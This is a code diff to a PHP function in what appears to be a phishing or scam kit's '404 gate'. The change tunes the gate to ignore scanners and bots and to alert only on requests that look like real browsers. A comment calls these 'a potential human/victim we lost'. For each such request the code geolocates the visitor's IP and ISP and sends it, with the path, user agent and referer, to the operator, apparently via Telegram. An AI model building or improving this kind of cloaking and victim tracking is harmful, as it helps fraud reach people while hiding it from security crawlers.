@@ -382,34 +382,31 @@ function geo(string $ip): array {
 // -------------------------------------------------- silent 404
 function forensics_404(): void {
     if (isset($_GET['hp'])) return;                 // scanners, not humans
+    // Bots/probers are the norm — stay silent for them. Only alert when the
+    // blocked request looks like a real browser (a potential human/victim we
+    // lost). Safari never sends Sec-Ch-Ua, so the signature is: real-browser
+    // UA + Sec-Fetch-Mode + Accept + Accept-Language.
+    $ua  = ua();
+    $looksHuman = (stripos($ua, 'AppleWebKit') !== false)
+        && req_header('Sec-Fetch-Mode') !== ''
+        && req_header('Accept') !== ''
+        && req_header('Accept-Language') !== '';
+    if (!$looksHuman) return;
     $f = RATE_DIR . '/fs_' . md5(ip());
     $now = time();
     $last = (int)@file_get_contents($f);
     if ($now - $last < 60) return;                  // 1 per IP per minute
     @file_put_contents($f, (string)$now);
-    $h = function (string $k) { return req_header($k); };
+    $g = geo(ip());
     $lines = [
-        '🔍 404-gate forensics',
-        'IP: ' . ip(),
-        'UA: ' . mb_substr(ua(), 0, 160),
-        'Path: ' . (string)($_SERVER['REQUEST_URI'] ?? ''),
-        'Host: ' . (string)($_SERVER['HTTP_HOST'] ?? ''),
-        'Referer: ' . (req_header('Referer') !== '' ? req_header('Referer') : '—'),
-        'Sec-Fetch-Site: ' . (req_header('Sec-Fetch-Site') !== '' ? req_header('Sec-Fetch-Site') : '—'),
-        'Sec-Fetch-Dest: ' . (req_header('Sec-Fetch-Dest') !== '' ? req_header('Sec-Fetch-Dest') : '—'),
-        'Sec-Fetch-Mode: ' . (req_header('Sec-Fetch-Mode') !== '' ? req_header('Sec-Fetch-Mode') : '—'),
-        'Sec-Fetch-User: ' . (req_header('Sec-Fetch-User') !== '' ? req_header('Sec-Fetch-User') : '—'),
-        'Sec-Ch-Ua: ' . mb_substr((string)$h('Sec-Ch-Ua'), 0, 120),
-        'Sec-Ch-Ua-Platform: ' . (req_header('Sec-Ch-Ua-Platform') !== '' ? req_header('Sec-Ch-Ua-Platform') : '—'),
-        'Sec-Ch-Ua-Mobile: ' . (req_header('Sec-Ch-Ua-Mobile') !== '' ? req_header('Sec-Ch-Ua-Mobile') : '—'),
-        'Upgrade-Insecure-Requests: ' . (req_header('Upgrade-Insecure-Requests') !== '' ? req_header('Upgrade-Insecure-Requests') : '—'),
-        'Accept: ' . mb_substr((string)$h('Accept'), 0, 80),
-        'Accept-Language: ' . (req_header('Accept-Language') !== '' ? req_header('Accept-Language') : '—'),
-        'XFF: ' . (req_header('X-Forwarded-For') !== '' ? req_header('X-Forwarded-For') : '—'),
+        '🔍 404-gate: possible human blocked',
+        '📍 ' . ip() . ' — ' . $g['city'] . ', ' . $g['country'] . ' (' . $g['isp'] . ')',
+        '📄 ' . (string)($_SERVER['REQUEST_URI'] ?? ''),
+        '🖥 ' . mb_substr($ua, 0, 120),
     ];
-    $lines = array_values(array_filter($lines, function ($l) {
-        return $l !== 'Path: ' && $l !== 'Host: ';
-    }));
+    if (req_header('Referer') !== '') {
+        $lines[] = '🔗 ' . mb_substr(req_header('Referer'), 0, 120);
+    }
     tg(mb_substr(implode("\n", $lines), 0, 2900));
 }
 
